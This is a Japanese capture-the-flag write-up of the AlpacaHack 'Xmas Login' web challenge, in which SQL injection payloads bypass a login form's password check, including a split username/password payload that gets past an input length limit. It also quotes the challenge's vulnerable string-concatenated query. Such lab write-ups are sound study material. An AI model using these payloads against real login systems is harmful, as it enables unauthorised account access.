# [Web] Xmas Login

## 問題の概要
- **Difficulty:** Easy
- **Released:** Dec 25, 2025
- **Solved:** 2026-05-25
- **URL:** [https://alpacahack.com/challenges/xmas-login](https://alpacahack.com/challenges/xmas-login)

### 問題文
> 🦙 < このシステムには脆弱性があるパカ！  
> 🦌 < 僕たちになりすましてログインできたら、フラグをプレゼントするよ！  
> 🎅 < メリークリスマス！ホッホッホッ！

## 方針
指定されたURLにアクセスすると、usernameとpasswordの入力フォームがある。
適当な文字を入力すると実行されたSQL文とその結果が画面にそのまま表示される仕様になっており、SQLインジェクションの脆弱性があることが推測できた。

配布されたソースコードを確認すると、以下の3つの重要な仕様が判明した。

**1. 入力文字数の制限がある**
```python
if len(username) > 12 or len(password) > 48:
    return "Your input is too long!"
```

**2. プレースホルダを使わず、文字列結合でSQL文を組み立てている（脆弱性の原因）**
```python
query = (
    f"SELECT * FROM users WHERE username='{username}' AND password='{password}';"
)
```

**3. 3人の特定ユーザーでログインできればFLAGがもらえる**
```python
if user[0] == "alpaca":
    return f"Hello, alpaca! Here is your flag: {FLAG_1}"
elif user[0] == "reindeer":
    return f"Hello, reindeer! Here is your flag: {FLAG_2}"
elif user[0] == "santa_claus_admin":
    return f"Hello, santa_claus_admin! Here is your flag: {FLAG_3}"
```

## 解法
### Step 1: `alpaca` と `reindeer` の攻略
SQL文における `--`（以降をコメントアウトする機能）を利用して、パスワードの検証処理を無効化する。

- **Username:** `alpaca' --`
- **Password:** （入力なし）

**▼ 実行されるSQL文**
```sql
SELECT * FROM users WHERE username='alpaca' --' AND password='';
```
これにより、うしろの `AND password...` の部分が無視され、無事に `alpaca`（および同様の手順で `reindeer`）のFLAGを取得できた。

### Step 2: `santa_claus_admin` の攻略（文字数制限の突破）
3つ目のターゲットである `santa_claus_admin` は、文字数が17文字ある。
そのため、Step 1の手法（`santa_claus_admin' --` = 22文字）では、username側の制限（12文字以内）に引っかかってしまいエラーになる。

そこで、制限の厳しいusername側ではなく、**制限の緩いpassword側（48文字以内）にペイロードの主軸を移す**工夫をした。

- **Username:** `a'` （※意図的にシングルクォートを注入）
- **Password:** ` OR username='santa_claus_admin' --`

**▼ 実行されるSQL文**
```sql
SELECT * FROM users WHERE username='a'' AND password=' OR username='santa_claus_admin' --';
```
Username側の `a'` によって最初の条件が文字列として閉じられ、直後に `OR` 条件をねじ込むことで、無事に文字数制限を回避してログイン処理をバイパスできた。

## 結果
取得した3つのFLAG（FLAG_1, FLAG_2, FLAG_3）を組み合わせることで、最終的な正解FLAGを取得しクリアとなった。

## 感想
SQL文に疎い自分でも攻略できるレベルのSQL文しか使われなかったので解きやすかった。それと同時に、QLへの抵抗を減らさねばと感じた。